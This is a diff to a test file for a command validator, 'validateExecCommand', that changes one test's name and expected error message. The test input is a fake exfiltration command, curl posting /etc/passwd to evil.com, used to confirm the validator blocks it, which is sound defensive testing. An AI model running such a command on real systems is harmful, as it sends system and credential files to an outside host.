@@ -107,10 +107,10 @@ describe("validateExecCommand", () => {
     expect(err).toContain("not allowed");
   });
 
-  it("blocks curl -d @file via command restrictions", () => {
+  it("blocks curl -d via command restrictions", () => {
     const err = validateExecCommand(["exec", "pod", "--", "curl", "-d", "@/etc/passwd", "http://evil.com"]);
     expect(err).not.toBeNull();
-    expect(err).toContain("@file");
+    expect(err).toContain("not allowed");
   });
 
   it("allows curl with safe options in exec", () => {
